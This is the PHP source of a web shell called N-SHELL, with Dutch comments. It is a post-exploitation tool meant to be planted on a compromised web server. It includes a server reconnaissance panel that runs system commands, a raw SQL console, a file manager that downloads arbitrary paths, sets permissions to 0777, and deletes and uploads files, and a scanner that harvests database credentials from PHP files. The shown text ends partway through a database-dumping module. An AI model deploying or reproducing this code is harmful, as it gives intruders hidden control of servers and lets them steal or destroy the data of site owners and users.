 
 
 
<?PHP
@session_regenerate_id();
if ($_GET['dow']) { // files via ftp editor downloaden
	@header("Content-type: application/octet-stream");
	@header("Content-Disposition: attachment; filename=" . $_GET['dow']);
	$file = readfile($_GET['dow']);
	exit();
}
?>
<script type="text/javascript">
	<!--
	var win=null;
	function NewWindow(mypage,myname,w,h,pos,infocus){
	if(pos=="random"){myleft=(screen.width)?Math.floor(Math.random()*(screen.width-w)):100;mytop=(screen.height)?Math.floor(Math.random()*((screen.height-h)-75)):100;}
	if(pos=="center"){myleft=(screen.width)?(screen.width-w)/2:100;mytop=(screen.height)?(screen.height-h)/2:100;}
	else if((pos!='center' && pos!="random") || pos==null){myleft=0;mytop=20}
	settings="width=" + w + ",height=" + h + ",top=" + mytop + ",left=" + myleft + ",scrollbars=yes,location=no,directories=no,status=no,menubar=no,toolbar=no,resizable=no";win=window.open(mypage,myname,settings);
	win.focus();}
	// -->
</script>
<?PHP
if ($_GET['2'] == '1') {
	phpinfo();
} else {
	error_reporting(0);
	set_magic_quotes_runtime(0);
	
	@set_time_limit(0);
	@ini_set('max_execution_time',0);
	@ini_set('output_buffering',0);
	
	$safe_mode = @ini_get('safe_mode');
	
	if (version_compare(phpversion(), '4.1.0') == -1) {
		$_POST   = &$HTTP_POST_VARS;
		$_GET    = &$HTTP_GET_VARS;
		$_SERVER = &$HTTP_SERVER_VARS;
		$_COOKIE = &$HTTP_COOKIE_VARS;
	}
	if (@get_magic_quotes_gpc()) {
		foreach ($_POST AS $k => $v){
			$_POST[$k] = stripslashes($v);
		}
	}
	$exit = explode(".txt?",$_SERVER['REQUEST_URI']);
	if ($exit[0] != $_SERVER['REQUEST_URI']) {
		if (isset($_GET)) {
			$url_z = $_SERVER['REQUEST_URI'];
			$rl = explode(".txt?",$url_z);
			$url = $rl[0] . ".txt?&";
			
			$pmaurl = explode("/",strrev($_SERVER['REQUEST_URI']));
			$pmaurll = strrev($pmaurl[0]);
			$file = explode("&x_pwned=pma",$pmaurll);
			$pmaurl_final = $file[0] . "&x_pwned=pma";
		}
	} else {
		$url_z = $_SERVER['REQUEST_URI'];
		$rl = explode(".php",$url_z);
		$url = $rl[0] . ".php?";
		
		$pmaurl = explode("/",strrev($_SERVER['REQUEST_URI']));
		$pmaurll = strrev($pmaurl[0]);
		$file = explode("&x_pwned=pma",$pmaurll);
		$pmaurl_final = $file[0] . "&x_pwned=pma";
	}
	if ($_GET['x_pwned'] == 'pma') {
		$surl_z = $_SERVER['REQUEST_URI'];
		$srl = explode(".txt?",$url_z);
		$surl = $srl[0] . ".txt?&x_pwned=pma&";
	}
	echo "<html><head>";
	echo "<title>==//N-SHEL\\\== by n0tiz and FiLEFUSiON</title>";
	echo "
	<style type='text/css'>
	body {
		background:#000000;
	}
	input {
		color: #736F6E;
		border: 1px solid #736F6E;
		background: #000000;
	}
	textarea {
		color: #736F6E;
		border: 1px solid #736F6E;
		background: #000000;
	}
	select {
		color: #736F6E;
		border: 1px solid #736F6E;
		background: #000000;
	}
	td.serverinfopwned {
		background:#191919;
		height:130;
		width:40%;
		color:#595353;
		text-align:left;
		font-size:9pt;
		padding-left:10px;
		padding-right:10px;
	}
	td.headerpwned {
		background:#191919;
		height:130;
		width:60%;
		color:#850A0A;
		text-align:center;
		font-size:10pt;
		font-weight:bold;
		padding-left:10px;
		padding-right:10px;
	}
	
	td.copyrightpwned {
		background:#191919;
		height:20;
		width:100%;
		color:#595353;
		text-align:center;
		font-size:9pt;
		padding-left:10px;
		padding-right:10px;
	}
	td.contentpwned {
		background:#191919;
		height:549;
		width:100%;
		color:#595353;
		text-align:left;
		font-size:9pt;
		padding-left:10px;
		padding-right:10px;
		padding-top:10px;
		padding-bottom:10px;
	}
	td.navigatiepwned {
		background:#191919;
		height:20;
		width:100%;
		color:#850A0A;
		text-align:center;
		font-size:9pt;
		letter-spacing:2px;
		padding-left:10px;
		padding-right:10px;
	}
	a.navigatiepwned {
		color:#850A0A;
		letter-spacing:1px;
		text-decoration:none;
	}
	a.navigatiepwned:visited {
		color:#850A0A;
		text-decoration:none;
	}
	a.navigatiepwned:hover {
		color:#595353;
		text-decoration:underline;
	}
	a.navigatiepwned:active {
		color:#850A0A;
		text-decoration:none;
	}
	a {
		color:#595353;
		text-decoration:none;
	}
	a:visited {
		color:#595353;
		text-decoration:none;
	}
	a:hover {
		color:#595353;
		text-decoration:underline;
	}
	a:active {
		color:#595353;
		text-decoration:none;
	}
	td {
		color:#595353;
		font-size:9pt;
	}	
	</style>
	";
	$uname = php_uname();
	$curuser = exec('whoami');
	echo "</head><body>";
	echo "<div align='center' width='100%'><table cellspacing='5' width='800'><tr><td class='serverinfopwned' valign='top'>";
	echo "<font color='#850A0A'><b>Serverinfo</b></font><br/>";
	
	echo "Safe Mode: <b>";
	if($safe_mode == 1){
		echo "ON";
	} else {
		echo "OFF";
	}
	echo "</b>";
	echo "<br />PHP Version: <b>".phpversion()."</b>";
	echo "<br />";
	echo "</b>";
	echo "Shell Directory: <b>".getcwd()."</b><br />";
	echo("Uname: <b>" . $uname . "</b><br>");
	echo("Current User:<b> " . $curuser . "</b><br>");
	echo("ID:<b>" . @exec('id') . "</b><br>");
	echo "Date: <b>";
	$vandaag = getdate();
	$maand = $vandaag['month'];
	$mdag = $vandaag['mday'];
	$jaar = $vandaag['year'];
	echo $mdag . " , " . $maand . " , " . $jaar;
	echo "</b><br />";
	echo "Your IP: <b>";
	if (getenv(HTTP_X_FORWARDED_FOR)) {							
	    echo getenv(HTTP_X_FORWARDED_FOR); 
	} else { 
	    echo getenv(REMOTE_ADDR);
	}
	echo "</b><br />";
	echo "Server IP: <b>";
	echo getenv("SERVER_ADDR");
	echo "</b><br />";
	echo "Server OS: <b>";
	echo php_uname("s");
	echo "</b>";
	echo "</td><td class='headerpwned'><pre> _______              _________.__           .__  .__   
 \      \            /   _____/|  |__   ____ |  | |  |  
 /   |   \   ______  \_____  \ |  |  \_/ __ \|  | |  |  
/    |    \ /_____/  /        \|   Y  \  ___/|  |_|  |__
\____|__  /         /_______  /|___|  /\___  >____/____/
        \/                  \/      \/     \/           </pre>";
	echo "</tr><tr><td class='navigatiepwned' colspan='3' valign='top'>";
	echo "<a href='" . $url . "x_pwned=home' class='navigatiepwned'>Home</a> | <a href='" . $url . "x_pwned=sql' class='navigatiepwned'>SQL commandline</a> | <a href='" . $url . "x_pwned=ftp' class='navigatiepwned'>FTP editor</a> | <a href='" . $url . "x_pwned=scf' class='navigatiepwned'>SQL connection finder</a> | <a href='" . $url . "x_pwned=exec' class='navigatiepwned'>PHP executer</a> | <a href='" . $url . "x_pwned=pma' class='navigatiepwned'>phpmyadmin</a> | <a href='" . $url . "x_pwned=cmd' class='navigatiepwned'>CMD</a> | <a href=\"javascript:NewWindow('" . $_SERVER['REQUEST_URI'] . "&2=1','PHPinfo()','900','500','custom','front');\" class='navigatiepwned'>PHPinfo();</a>";
	echo "</td></tr><tr><td class='contentpwned' colspan='3' valign='top'>";
		if ($_GET['x_pwned'] == 'sql') { // sql-commando-lijn
			echo "<div align='center'>";
			if(!(@mysql_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass']) && @mysql_select_db($_SESSION['data']))) { // sql connectie met sessies
				if (isset($_POST['connect'])) {
					if (empty ($_POST['host']) OR empty ($_POST['user']) OR empty ($_POST['pass']) OR empty ($_POST['data'])) {
						echo "<font color='red'>Kon geen connectie maken.</font>";
					} else {
						$_SESSION['host'] = $_POST['host'];
						$_SESSION['user'] = $_POST['user'];
						$_SESSION['pass'] = $_POST['pass'];
						$_SESSION['data'] = $_POST['data'];
						echo "<font color='green'>Database-connectie gelukt.</font>";
						echo "<meta http-equiv=Refresh content=1;url=" . $_PHP['SELF'] .">";
					}
				}
				echo '
				<form method="POST" action="' . $_PHP['SELF'] . '">
				Host: <input type="text" name="host"><br />
				User: <input type="text" name="user"><br />
				Pass: <input type="text" name="pass"><br />
				Data: <input type="text" name="data"><br />
				<input type="submit" name="connect" value="Connect database !">
				</form>
				';
			} else if (mysql_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass']) && @mysql_select_db($_SESSION['data'])) {
				if (isset($_POST['submit'])) {
					if (mysql_query("{$_POST['command']}")) {
						echo "<p><br /></p><font color=green>".$_POST['command']."</font><br />is succesvol uitgevoerd.<p><br /></p>";
					} else {
						echo "<font color=red>Commando kon niet uitgevoerd worden.</font>";
					}
					echo "<p><br /></p>";
				}
				echo "<form method='POST'>Command: <input name='command' type='text' size='50'><input name='submit' type='submit' value='Send command !'></form><p><br /></p></div>";
			}
		} else if ($_GET['x_pwned'] == 'ftp') { // file editor, map browser, ...
			/*if (isset($_GET['map'])) {
				$map = $_GET['map'];
			} else {
				$map = ".";
			}*/
			echo "<div align='left'>";
			/*if ($handle = opendir($map)) {
				while (false !== ($file = readdir($handle))) {
					$index = explode("?",$_SERVER['REQUEST_URI']);
					$files = explode(".",$file);
					if ($files[1] == "") {
						if (isset($_GET['map'])) {
							$mp = $_GET['map'] . "/" . $file;
						} else {
							$mp = $file;
						}
						echo "<a href='" . $index[0] . "?x_pwned=ftp&map=" . $mp . "'>" . $file . "</a><br />";
					} else {
						echo "<a href='" . $index[0] . "?x_pwned=ftp&file=" . $file . "'>" . $file . "</a><br />";
					}
				}
				closedir($handle);
			}*/
			function dec_str($line, $len) {
				if (strlen($line) > $len) {
					$afgekort = substr($line, 0, $len) . "...";
				} else {
					$afgekort = $line;
				}
				return $afgekort;
			}
			function getalcheck($iGetal) {
				$iNum = ($iGetal / 2);
				$aNum = explode('.', $iNum);
				if($aNum[1] == 5) {
					$iEven = 0;
				} else {
					$iEven = 1;
				}
				return $iEven;
			}
			echo '<table cellpadding="0" cellpadding="0" width="100%" height="100%"><tr><td colspan="6" width="100%">';
			if(!$_GET['map']){
				echo '<table cellpadding="0" cellpadding="0" width="100%"><tr><td align="left"><b>root</b></td></tr></table></td></tr>';
			} else {
				echo '<table cellpadding="0" cellpadding="0" width="100%"><tr><td align="left" width="50%"><b>' . $_GET['map'] . '</b></td><td align="left" width="50%"><a href="' . $url . 'x_pwned=ftp&map=' . $_GET['v']. '">Terug</a></td></tr></table></td></tr>';
			}
			echo '<tr><td width="30" valign="top"></td><td width="370" valign="top">';
			if($_GET['map']){
				echo '<table cellspacing="0" cellpadding="0" width="100%">';
				$map = $_GET['map'] . "*";
				$files = glob($map);
				if(!$files){
					echo "<tr><td colspan='5'><font color='red'>Geen bestanden in deze map!</font></td></tr>";
				} else {
					foreach ($files as $f) {
						$f = ereg_replace($_GET['map'], "", $f);
						echo '<tr>';
						$extensie = explode(".", $f);
						if(strlen($extensie[1]) > 0){
							// Geen bestanden laten zien he!            
						} else {
							chmod($_GET['map'] . $f . "/", 0777);
							if (is_writable($_GET['map'] . $f . "/")) {
								$font = "<font color=green>";
								$font_eind = "</font>";
							}
							echo '<td width="35"><b>map</b></td>';
							echo '<td><a href="' . $url . 'x_pwned=ftp&map=' . $_GET['map'] . $f . '/&v=' . $_GET['map'] . '">' . $font . dec_str($f, 35) . $font_eind . '</a></td><td align="right" width="100"><a href="' . $url . 'x_pwned=ftp&map=' . $_GET['map'] . '&ver=' . $_GET['map'] . $f . '/">[v]</a></td>';
							$bg++;
						}
						echo '</tr>';
					}
					$map = $_GET['map'] . "*";
					$files = glob($map);
					foreach($files as $f){
			            echo '<tr>';
			            $f2 = ereg_replace($_GET['map'], "", $f);
						$extensie = explode(".", $f);
						chmod($_GET['map'] . $f2, 0777);
						if(strlen($extensie[1]) > 2){
							echo '<td width="35"><i>file</i></td>';
			                echo '<td>' . dec_str($f2, 35) . '</td><td align="right" width="100"><a href="' . $url . 'x_pwned=ftp&map=' . $_GET['map'] . '&dow=' . $f . '">[d]</a> - <a href="' . $url . 'x_pwned=ftp&map=' . $_GET['map'] . '&bew=' . $f2 . '">[b]</a> - <a href="' . $url . 'x_pwned=ftp&map=' . $_GET['map'] . '&ver=' . $f . '/">[v]</a></td>';
						}else{
							// Geen bestanden laten zien he! 
						}
						echo '</tr>';
					}
				}
				echo "</table>";
			} else {
				echo '<table cellspacing="0" cellpadding="0" width="100%">';
				$files = glob("*");
				foreach($files as $f){
					echo '<tr>';
					$extensie = explode(".", $f);
					if(strlen($extensie[1]) > 0){
						// Geen bestanden laten zien he!            
					} else {
						chmod($f . "/", 0777);
						if (is_writable($f . "/")) {
							$font = "<font color=green>";
							$font_eind = "</font>";
						}
						echo '<td width="35"><b>map</b></td>';
						echo '<td><a href="' . $url . 'x_pwned=ftp&map=' . $f . '/&v=">' . $font . dec_str($f, 35) . $font_eind . '</a></td><td align="right" width="100"><a href="' . $url . 'x_pwned=ftp&map=' . $_GET['map'] . '&ver=' . $f . '/&v=">[v]</a></td>';
						$bg++;
					}
					echo '</tr>';
				}
				$files = glob("*.*");
				foreach($files as $f){
					echo '<tr>';
					$extensie = explode(".", $f);
					if(strlen($extensie[1]) > 2){
						chmod($f, 0777);
						echo '<td width="35"><i>file</i></td>';
						echo '<td>' . dec_str($f, 35) . '</td><td align="right" width="100"><a href="' . $url . 'x_pwned=ftp&map=' . $_GET['map'] . '&dow=' . $f . '&v=">[d]</a> - <a href="' . $url . 'x_pwned=ftp&map=' . $_GET['map'] . '&bew=' . $f . '&v=">[b]</a> - <a href="' . $url . 'x_pwned=ftp&map=' . $_GET['map'] . '&ver=' . $f . '/&v=">[v]</a></td>';
					} else {
						// Geen bestanden laten zien he!   
					}
					echo '</tr>';
				}
				echo "</table>";
			}
			echo "</td><td width='400' valign='top' align='center'>";
			if (isset($_GET['ver'])) { // files verwijderen
				$file_delete = $_GET['ver'];
				if (@unlink($file_delete) OR @rmdir($file_delete)) {
					echo "<font color='green'>" . dec_str($file_delete, 35) . " is succesvol verwijderd.</font>";
				} else {
					echo "<font color='red'>" . dec_str($file_delete, 35) . " kon niet verwijderd worden.</font>";
				}
			} else if (isset($_GET['bew'])) { // nu: files bekijken; later: files bekijken/bewerken
				function File_Scan($dir) {
					$handle=opendir($dir);
					while(($file=readdir($handle))!==FALSE) {
						$point = $dir . $file;
						if($file == $_GET['bew']){
							$myFile = $point;
							$fh = fopen($myFile, 'r');
							$theData = fread($fh, filesize($myFile));
							fclose($fh);
							$ext = explode(".",$_GET['bew']);
							if ($ext[1] == 'jpg' OR $ext[1] == 'png' OR $ext[1] == 'jpeg' OR $ext[1] == 'gif' OR $ext[1] == 'bmp') {
								echo $_GET['bew'] . "<br />";
								echo "<img src='" . $dir . $_GET['bew'] . "'>";
							} else {
								echo "<center>";
								echo $_GET['bew'] . "<br />";
								echo '<textarea rows="25" cols="40">';
								echo htmlspecialchars($theData);
								echo '</textarea>';
								echo "</center>";
							}
						}
					}
				}
				if ($_GET['map']) {
					$dir = "./" . $_GET['map'];
				} else {
					$dir = "./";
				}
				File_Scan($dir);
			} else { // files uploaden
				if ($_POST['loadup']) {
					if ($_GET['map']) {
						$uploaddir = $_GET['map'];
					} else {
						$uploaddir = '';
					}
					$uploadfile = $uploaddir . $_FILES['upfile']['name'];
					if (move_uploaded_file($_FILES['upfile']['tmp_name'], $uploadfile)) {
						echo "<font color='green'>File upload is gelukt.</font>";
					} else {
						echo "<font color='red'>File upload mislukt.</font>";
					}
				}
				echo '<form enctype="multipart/form-data" action="' . $_PHP['SELF'] . '" method="post">';
				echo 'File:<input name="upfile" type="file"><input name="loadup" type="submit" value="Upload">';
				echo '</form><br /><br />';
				// createdir
				if ($_POST['dir']) {
					if ($_GET['map']) {
						$dirbefore = $_GET['map'];
					} else {
						$dirbefore = "./";
					}
					$totaldir = $dirbefore . $_POST['dirname'];
					if (mkdir($totaldir, 0777)) {
						echo "<font color='green'>De map is succesvol aangemaakt.</font>";
					} else {
						echo "<font color='red'>Het aanmaken van de map is mislukt.</font>";
					}
				}
				echo '<form action="' . $_PHP['SELF'] . '" method="post">';
				echo 'Dirname:<input name="dirname" type="text" size="28"><input name="dir" type="submit" value="Make Dir">';
				echo '</form>';
			}
			echo "</td></tr></table>";
			echo "</div>";
		} else if($_GET['x_pwned'] == 'scf') { // config finder
			echo "<div align='center'>";
			// script zoekt naar files die string mysql_select_db bevatten zodat je in de SQL commandline kunt inloggen met de db gegevens
			
			function scf($map) {
				$handle = opendir($map);
				while (false!==($file = readdir($handle))) {
					if ($file != "." AND $file != "..") {
						$file_map=$map."/".$file;
						$extensie = explode(".", $file);
						if ($extensie[1] == "php") {
							$file2 = file_get_contents($file_map);
							if(ereg("mysql_select_db",$file2) OR ereg("mysql_connect",$file2)) {
								echo $file_map . "<br />";
								$myFile = $file_map;
								$fh = fopen($myFile, 'r');
								$theData = fread($fh, filesize($myFile));
								fclose($fh);
								echo '<textarea rows="13" cols="80">';
								echo htmlspecialchars($theData);
								echo '</textarea><br /><br />';
							}
						}
						if(is_dir($file_map))
	            			scf($file_map);
					}
				}
			}
			$map = ".";
			scf($map);
			echo "</div>";
		}  else if ($_GET['x_pwned'] == 'pma') { // phpmyadmin
			// de functies die nodig zijn voor de phpmyadmin
			function view_size($size) {
				if (!is_numeric($size)) {
					return FALSE;
				} else {
					if ($size >= 1073741824) {
						$size = round($size/1073741824*100)/100 ." GB";
					} elseif ($size >= 1048576) {
						$size = round($size/1048576*100)/100 ." MB";
					} elseif ($size >= 1024) {
						$size = round($size/1024*100)/100 ." KB";
					} else {
						$size = $size . " B";
					}
					return $size;
				}
			}
			function mysql_dump($set) {
				global $shver;
				$sock = $set["sock"];
				$db = $set["db"];
				$echo = $set["echo"];
				$nl2br = $set["nl2br"];
				$file = $set["file"];
				$add_drop = $set["add_drop"];
				$tabs = $set["tabs"];
				$onlytabs = $set["onlytabs"];
				$ret = array();
				$ret["err"] = array();
				if (!is_resource($sock)) {
					echo("Error: \$sock is not valid resource.");
				}
				if (empty($db)) {
					$db = "db";
				}
				if (empty($echo)) {
					$echo = 0;
				}
				if (empty($nl2br)) {
					$nl2br = 0;
				}
				if (empty($add_drop)) {
					$add_drop = TRUE;
				}
				if (empty($file)) {
					$file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db.".sql";
				}
				if (!is_array($tabs)) {
					$tabs = array();
				}
				if (empty($add_drop)) {
					$add_drop = TRUE;
				}
				if (sizeof($tabs) == 0) {
					// retrive tables-list
					$res = mysql_query("SHOW TABLES FROM ".$db, $sock);
					if (mysql_num_rows($res) > 0) {
						while ($row = mysql_fetch_row($res)) {
							$tabs[] = $row[0];
						}
					}
				}
				$out = "
	# Dumped by N-SHELL.SQL
	# Homepage: n0tiz.be and hackers-project.info
	#
	# Host settings:
	# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
	# Date: ".date("d.m.Y H:i:s")."
	# DB: \"".$db."\"
	#---------------------------------------------------------
	";
				$c = count($onlytabs);
				foreach($tabs as $tab) {
					if ((in_array($tab,$onlytabs)) or (!$c)) {
						if ($add_drop) {
							$out .= "DROP TABLE IF EXISTS `".$tab."`;";
						}
						$res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
						if (!$res) {
							$ret["err"][] = mysql_smarterror();
						} else {
							$row = mysql_fetch_row($res);
							$out .= $row["1"].";";
							$res = mysql_query("SELECT * FROM `$tab`", $sock);
							if (mysql_num_rows($res) > 0) {
								while ($row = mysql_fetch_assoc($res)) {
									$keys = implode("`, `", array_keys($row));
									$values = array_values($row);
									foreach($values as $k=>$v) {
										$values[$k] = addslashes($v);
									}
									$values = implode("', '", $values);
									$sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');";
									$out .= $sql;
								}
							}
						}
					}
				}
				$out .= "
	#---------------------------------------------------------
	";
				if ($file) {
					$fp = fopen($file, "w");
					if (!$fp) {
						$ret["err"][] = 2;
					} else {
						fwrite ($fp, nl2br($out));
						fclose ($fp);
					}
				}
				if ($echo) {
					if ($nl2br) {
						echo nl2br($out);
					} else {
						echo nl2br($out);
					}
				}
				return $out;
			}
			function mysql_buildwhere($array,$sep=" and",$functs=array()) {
				if (!is_array($array)) {
					$array = array();
				}
				$result = "";
				foreach($array as $k=>$v) {
					$value = "";
					if (!empty($functs[$k])) {
						$value .= $functs[$k]."(";
					}
					$value .= "'".addslashes($v)."'";
					if (!empty($functs[$k])) {
						$value .= ")";
					}
					$result .= "`".$k."` = ".$value.$sep;
				}
				$result = substr($result,0,strlen($result)-strlen($sep));
				return $result;
			}
			function mysql_fetch_all($query,$sock) {
				if ($sock) {
					$result = mysql_query($query,$sock);
				} else {
					$result = mysql_query($query);
				}
				$array = array();
				while ($row = mysql_fetch_array($result)) {
					$array[] = $row;
				}
				mysql_free_result($result);
				return $array;
			}
			function mysql_smarterror($type,$sock) {
				if ($sock) {
					$error = mysql_error($sock);
				} else {
					$error = mysql_error();
				}
				$error = htmlspecialchars($error);
				return $error;
			}
			function mysql_query_form() {
				global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
				if (($submit) and (!$sql_query_result) and ($sql_confirm)) {
					if (!$sql_query_error) {
						$sql_query_error = "Query was empty";
					}
					echo "<b>Error:</b> <br />".$sql_query_error."<br />";
				}
				if ($sql_query_result or (!$sql_confirm)) {
					$sql_act = $sql_goto;
				}
				if ((!$submit) or ($sql_act)) {
					echo "<table border=0><tr><td><form name='n-shellsh_sqlquery' method=POST><b>";
					if (($sql_query) and (!$submit)) {
						echo "Do you really want to";
					} else {
						echo "SQL-Query";
					}
					echo ":</b><br /><br /><textarea name=sql_query cols=80 rows=10>".htmlspecialchars($sql_query)."</textarea><br /><br /><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value='".htmlspecialchars($sql_tbl)."'><input type=hidden name=submit value='1'><input type=hidden name='sql_goto' value='".htmlspecialchars($sql_goto)."'><input type=submit name=sql_confirm value='Yes'>&nbsp;<input type=submit value='No'></form></td>";
					if ($tbl_struct) {
						echo "<td valign='top'><b>Fields:</b><br />";
						foreach ($tbl_struct as $field) {
							$name = $field["Field"];
							echo "?<a href='#' onclick='document.n-shellsh_sqlquery.sql_query.value+='`".$name."`';'><b>".$name."</b></a><br />";
						}
						echo "</td></tr></table>";
					}
				}
				if ($sql_query_result or (!$sql_confirm)) {
					$sql_query = $sql_last_query;
				}
			}
			function mysql_create_db($db,$sock="") {
				$sql = "CREATE DATABASE `".addslashes($db)."`;";
				if ($sock) {
					return mysql_query($sql,$sock);
				} else {
					return mysql_query($sql);
				}
			}
			function mysql_query_parse($query) {
				$query = trim($query);
				$arr = explode (" ",$query);
				$types = array(
				"SELECT"=>array(3,1),
				"SHOW"=>array(2,1),
				"DELETE"=>array(1),
				"DROP"=>array(1)
				);
				$result = array();
				$op = strtoupper($arr[0]);
				if (is_array($types[$op])) {
					$result["propertions"] = $types[$op];
					$result["query"]  = $query;
					if ($types[$op] == 2) {
						foreach($arr as $k=>$v) {
							if (strtoupper($v) == "LIMIT") {
								$result["limit"] = $arr[$k+1];
								$result["limit"] = explode(",",$result["limit"]);
								if (count($result["limit"]) == 1) {
									$result["limit"] = array(0,$result["limit"][0]);
								}
								unset($arr[$k],$arr[$k+1]);
							}
						}
					}
				} else {
					return FALSE;
				}
			}
			// einde functies phpmyadmin
			// Sending headers
			@ob_start();
			@ob_implicit_flush(0);
			
			$sort = htmlspecialchars($sort);
			if (empty($sort)) {
				$sort = $sort_default;
			}
			$sort[1] = strtolower($sort[1]);
			$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
			if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {
				$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();
			}
			// einde sending headers
		
			//Starting calls
			function getmicrotime() {
				list($usec, $sec) = explode(" ", microtime());
				return ((float)$usec + (float)$sec);
			}
			error_reporting(5);
			@ignore_user_abort(TRUE);
			@set_magic_quotes_runtime(0);
			$win = strtolower(substr(PHP_OS,0,3)) == "win";
			define("starttime",getmicrotime());
			if (get_magic_quotes_gpc()) {
				if (!function_exists("strips")) {
					function strips(&$arr,$k="") {
						if (is_array($arr)) {
							foreach($arr as $k=>$v) {
								if (strtoupper($k) != "GLOBALS") {
									strips($arr["$k"]);
								}
							}
						} else {
							$arr = stripslashes($arr);
						}
					}
				}
				strips($GLOBALS);
			}
			$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
			foreach($_REQUEST as $k=>$v) {
				if (!isset($$k)) {
					$$k = $v;
				}
			}
			
			//CONFIGURATION AND SETTINGS
			if (!empty($unset_nurl)) {
				setcookie("n-shell_nurl");
				$nurl = "";
			} elseif (!empty($set_nurl)) {
				$nurl = $set_nurl;
				setcookie("n-shell_nurl",$nurl);
			} else {
				$nurl = $_REQUEST["n-shell_nurl"]; //Set this cookie for manual nurl
			}
			
			$nurl_autofill_include = TRUE; //If TRUE then search variables with descriptors (URLs) and save it in nurl.
			
			if ($nurl_autofill_include and !$_REQUEST["n-shell_nurl"]) {
				$include = "&";
				foreach (explode("&",getenv("QUERY_STRING")) as $v) {
					$v = explode("=",$v);
					$name = urldecode($v[0]);
					$value = urldecode($v[1]);
					foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {
						if (strpos($value,$needle) === 0) {
							$includestr .= urlencode($name)."=".urlencode($value)."&";
						}
					}
				}
				if ($_REQUEST["nurl_autofill_include"]) {
					$includestr .= "nurl_autofill_include=1&";
				}
			}
			if (empty($nurl)){
				$nurl = "?".$includestr; //Self url
			}
			$nurl = htmlspecialchars($nurl) . "x_pwned=pma&";
			
			$sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending
			$sort_save = TRUE; //If TRUE then save sorting-position using cookies.
			
			$sess_cookie = "n-shellshvars"; // Cookie-variable name
			
			@$f = $_REQUEST["f"];
			@extract($_REQUEST["n-shellshcook"]);
			//END CONFIGURATION
			
			echo "<div align='center'>";
			// phpmyadmin
			echo "<table width='100%' height='100%'><tr><td width='100%' valign='top'>";
		
			$sql_surl = $surl;
			if ($sql_login)  {
				$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);
			}
			if ($sql_passwd) {
				$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);
			}
			if ($sql_server) {
				$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);
			}
			if ($sql_port)   {
				$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);
			}
			if ($sql_db)     {
				$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);
			}
			$sql_surl .= "&";
			echo '<table width="100%"><tr><td width="100%" colspan="2" valign="top" align="center">';
			if ($sql_server) {
				$sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
				$err = mysql_smarterror();
				@mysql_select_db($sql_db,$sql_sock);
				if ($sql_query and $submit) {
					$sql_query_result = mysql_query($sql_query,$sql_sock);
					$sql_query_error = mysql_smarterror();
				}
			} else {
				$sql_sock = FALSE;
			}
			if (!$sql_sock) {
				if (!$sql_server) {
					echo "Geen connectie";
				} else {
					echo "<font color='red'>Kan geen connectie maken.</font>";
					echo $err;
				}
			} else {
				$sqlquicklaunch = array();
				$sqlquicklaunch[] = array("Index",$surl."sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
				$sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));
				$sqlquicklaunch[] = array("Server-status",$surl."sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
				$sqlquicklaunch[] = array("Server variables",$surl."sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
				echo "<font color='green'>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - '".htmlspecialchars($sql_passwd)."')</font><br />";
				if (count($sqlquicklaunch) > 0) {
					foreach($sqlquicklaunch as $item) {
						echo "<a href='".$item[1]."'>".$item[0]."</a> ";
					}
				}
			}
			echo "</td></tr><tr>";
			if (!$sql_sock) {
				echo '<td width="90%" height="1" valign="top"><table cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="' . $surl . '" method="POST"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td>';
				echo "</table>";
			} else {
				//Start left panel
				echo "<td width='100%'><div style='width:155px; height:100%; overflow:auto;'><table width='155' height='100'><tr>";
				if (!empty($sql_db)) {
					echo '<td width="155" height="100%" valign="top">';
					$result = mysql_list_tables($sql_db);
					if (!$result) {
						echo mysql_smarterror();
					} else {
						echo "<a href='".$sql_surl."&'><b>".htmlspecialchars($sql_db)."</b></a><br /><br />";
						$c = 0;
						while ($row = mysql_fetch_array($result)) {
							$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]);
							$count_row = mysql_fetch_array($count);
